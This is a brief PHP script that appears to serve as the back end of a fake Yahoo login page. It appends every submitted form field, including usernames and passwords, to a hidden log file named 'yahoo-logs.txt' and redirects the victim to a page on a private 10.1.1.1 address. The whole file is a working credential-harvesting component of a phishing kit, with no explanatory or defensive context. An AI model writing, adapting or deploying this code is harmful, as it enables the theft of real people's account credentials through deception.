<?php    
    header('Location: http://10.1.1.1/yahoo-login/redirect.html');
    $handle = fopen("../lOgZ/yahoo-logs.txt", "a");
    foreach($_POST as $variable => $value) {
        fwrite($handle, $variable);
        fwrite($handle, "=");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }
    fwrite($handle, "\r\n");
    fclose($handle);
    exit;
?>
